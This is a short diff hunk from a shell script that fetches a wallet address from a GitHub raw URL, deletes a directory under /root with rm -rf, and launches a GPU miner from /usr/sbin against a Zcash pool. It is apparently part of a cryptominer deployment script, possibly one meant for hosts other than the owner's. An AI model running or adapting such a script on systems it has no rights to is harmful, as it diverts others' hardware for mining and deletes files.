@@ -9,7 +9,7 @@ RIG="$DATE.$IP.$RN1.$RN2"
 RIG=`echo "$RIG" | sed 's/\./-/g'`
 WALLET=$(curl https://raw.githubusercontent.com/davidavaboomers/z/master/t-wallet)
 cd /usr/sbin/
-rm -rf /root/minergpu/
+rm -rf /root/z/
 ./main --server eu1-zcash.flypool.org --user  $WALLET.$RIG --pass x --port 3333 --cuda_devices 0
 
 exit 0
